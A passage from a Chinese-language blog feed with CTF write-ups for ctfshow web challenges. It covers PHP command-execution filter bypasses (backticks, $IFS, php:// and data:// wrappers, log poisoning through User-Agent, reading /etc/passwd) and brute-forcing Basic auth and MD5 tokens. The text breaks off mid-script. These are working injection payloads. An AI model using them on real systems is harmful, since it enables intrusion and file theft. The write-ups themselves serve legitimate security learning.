    <published>2023-01-15T16:00:00.000Z</published>
    <updated>2023-01-16T12:53:52.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前进，前进，不能停下脚步！</p><span id="more"></span><h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法很多，和没过滤差不多</p></li><li><p>构造payload<br>有很多种绕过方式，以下随意列举几种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `tac f*`;</span><br><span class="line">?c=system(&#x27;tac f*&#x27;);</span><br><span class="line">?c=echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure></li></ol><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法还是很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 file -f:报错出具体内容 grep</span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br></pre></td></tr></table></figure></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `tac f*`;</span><br><span class="line">?c=echo `cat f*`;</span><br><span class="line">?c=echo `more f*`;</span><br><span class="line">?c=echo `less f*`;</span><br><span class="line">?c=echo `head -n 20 f*`;</span><br><span class="line">?c=echo `tail -n 20 f*`;</span><br></pre></td></tr></table></figure></li></ol><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次对空格进行了过滤，那么可以代替空格的有：<br><code>&lt;  &lt;&gt;  %09(tab)  $IFS$9  $&#123;IFS&#125;</code></p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=echo(`tac%09f*`);    // 在这里能使用的只有%09</span><br><span class="line">?c=echo(`tac\$&#123;IFS&#125;f*`);    // 要记得加转义字符</span><br><span class="line">?c=echo(`tac\$IFS\$9f*`);</span><br><span class="line">?c=eval($_GET[1]);&amp;1=system(&#x27;nl flag.php&#x27;);   // 可以采用这种嵌套的方式绕过过滤</span><br><span class="line">?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>过滤了括号，所以要用不需要括号的函数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo 123;</span><br><span class="line">print 123;</span><br><span class="line">die;</span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>过滤了分号（;），可以使用 <code>?&gt;</code> 代替</li></ol><p>使用php伪协议将include包含的文件在页面上显示出来</p><ol start="2"><li>构造payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include&quot;$_GET[1]&quot;?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>页面显示base64编码的内容，解码可得flag</li></ol><p>或者也可以使用data伪协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include&quot;$_GET[1]&quot;?&gt;&amp;1=data:text/plain,&lt;?= `tac flag.php`;?&gt;</span><br></pre></td></tr></table></figure><p>成功拿到flag</p><h1 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤了一个双引号，不用就行了</p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure></li></ol><h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>data:</code> ，可以让用户来控制输入流，当它与包含函数(inlcude,require等)结合时，用户输入的data流会被当作php文件执行</p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure><p>也可以通过包含日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>同时抓包修改User-Agent: <code>&lt;?php system(&#39;tac f*&#39;);?&gt;</code><br>成功拿到flag</p></li></ol><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>区别不大</p></li><li><p>构造payload<br>同上。<br>成功拿到flag</p></li></ol><h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在文件包含函数后面加了.php，这下不能使用日志包含了。<br>但是仍然能用data协议，因为php的尖括号已经闭合了，所以后面加.php也没用</p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>过滤了一堆，但是注意过滤的括号是中文括号，因此除了字母空格还能用括号</li></ol><ul><li><p>localeconv()函数<br>获取数字格式信息。<br>返回包含本地化数字和货币格式信息的关联数组。<br>其中第一位返回小数点(.)，这个正是我们需要的<br><a href="https://www.php.net/manual/zh/function.localeconv.php">localeconv()函数的详细信息</a></p></li><li><p>pos()函数<br>current() 的别名<br>返回数组中的当前值</p></li><li><p>scandir()函数<br>列出指定路径中的文件和目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="keyword">string</span> <span class="variable">$directory</span>, <span class="keyword">int</span> <span class="variable">$sorting_order</span> = SCANDIR_SORT_ASCENDING, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="keyword">array</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>返回 array，包含有 directory 中的文件和目录。</p></li></ul><p>返回值<br>成功则返回包含有文件名的 array，如果失败则返回 false。如果 directory 不是个目录，则返回布尔值 false 并生成一条 E_WARNING 级的错误。</p><ul><li><p>array_reverse()函数<br>返回单元顺序相反的数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reverse</span>(<span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">bool</span> <span class="variable">$preserve_keys</span> = <span class="literal">false</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>array_reverse() 接受数组 array 作为输入并返回一个单元为相反顺序的新数组。</p></li><li><p>next()函数<br>将数组中的内部指针向前移动一位</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="keyword">array</span>|<span class="keyword">object</span> &amp;<span class="variable">$array</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>next() 和 current() 的行为类似，只有一点区别，在返回值之前将内部指针向前移动一位。这意味着它返回的是下一个数组单元的值并将数组指针向前移动了一位。或当没有更多单元时返回 false。</p></li></ul><p>pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。<br>为了得到倒数第二个元素，将数组逆序再将指针调整到下一个。</p><ol start="2"><li>构造payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure></li></ol><p>或者可以使用另一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">1=system(&#x27;tac f*&#x27;);</span><br></pre></td></tr></table></figure><p>成功拿到flag</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前进，前进，不能停下脚步！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="命令执行" scheme="http://example.com/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-爆破</title>
    <link href="http://example.com/2023/01/13/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/"/>
    <id>http://example.com/2023/01/13/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/</id>
    <published>2023-01-12T16:00:00.000Z</published>
    <updated>2023-01-14T13:36:14.490Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于爆破，我的能力还非常不足，虽说是最后手段，但尽量不要有短板比较好。</p><span id="more"></span><h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><p>打开页面后，是一个需要输入用户名和密码的网页，随便填写了用户名admin,密码123后，开始抓包。<br>抓包后送到Repeater进行分析，发现有一个 <code>Authorization: Base YWRtaW46MTIz</code><br>将后半段明显加密的部分送到Decoder进行分析，发现是Base64加密，解密后的内容是: <code>admin:123</code><br>那么接下来就是到Intruder进行爆破</p><ul><li><p>Positions处<br>如果已经有符号了先Clear,再在密文两边Add</p></li><li><p>Payloads处<br>在Payload Options [Simple List]处Load从ctfshow的web21处下载的字典<br>在Payload Processing处点击Add,选择Add prefix,输入 <code>admin:</code> 。因为我们已经知道用户名和格式是这个了，这样可以提高效率。<br>再次点击Add，选择Encode，再选择Base64-encode,因为我们之前已经验证了是Base64加密。<br>把最后的URL-encode these characters的勾选取消，因为会导致编码错误。</p></li></ul><p>如果嫌默认线程10比较慢的话，可以在Resource Pool下自定义线程和延迟时间等等。</p><p>接下来就是Start Attack，稍等一下，然后找到响应为200或长度与其它不同的包，找响应，即可拿到flag。</p><h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><p>可以用这个网站在线爆破子域名:<a href="http://z.zcjun.com/">http://z.zcjun.com/</a><br>不过爆破不出，子域名的flag在vip.ctf.show里。<br>在标签上即可拿到flag</p><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>从题可以看出，我们需要通过GET方式传入一个名为token的参数，要求是token参数的md5值的第1位&#x3D;第14位&#x3D;第17位，并且取得该md5值的第1位，第14位，第17位的整数值相加再除以md5值的第1位&#x3D;该md5值的第31位。<br>如果以上条件均满足，则能取得flag。由于条件比较宽松，我们可以直接用burp爆破，线程调高一点，直接从1-10000爆破，可以发现，数字422和1202均满足条件。<br>或者写一个PHP脚本，如下所示：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s1</span> = <span class="string">&#x27;1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZqwertyuiopasdfghjklzxcvbnm&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="number">62</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span>&lt;<span class="number">62</span>; <span class="variable">$k</span>++)&#123;</span><br><span class="line">        <span class="variable">$t3</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$s1</span>[<span class="variable">$j</span>].<span class="variable">$s1</span>[<span class="variable">$k</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">31</span>,<span class="number">1</span>))) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;token=&quot;</span>.<span class="variable">$s1</span>[<span class="variable">$j</span>].<span class="variable">$s1</span>[<span class="variable">$k</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这样可以得到3j和ZE满足条件。<br>又或者写一个Python脚本，如下所示：<figure class="highlight 